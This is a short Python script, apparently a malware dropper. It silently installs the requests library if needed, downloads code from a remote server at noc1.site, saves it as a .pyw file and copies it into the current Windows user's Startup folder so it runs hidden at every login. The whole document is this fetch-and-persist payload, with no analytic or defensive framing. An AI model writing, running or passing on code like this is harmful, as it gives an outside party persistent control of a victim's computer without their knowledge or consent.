try:
    import requests, getpass, json, shutil
except ImportError:
    __import__('os').system('pip3 install requests')
    import requests, getpass, json, shutil
with open('python.pyw', 'w') as file:
    file.write(json.loads(requests.get('http://noc1.site/api/get_code').text)['code'])
dir_name = f'C:/Users/{getpass.getuser()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'
shutil.copy('python.pyw', dir_name)
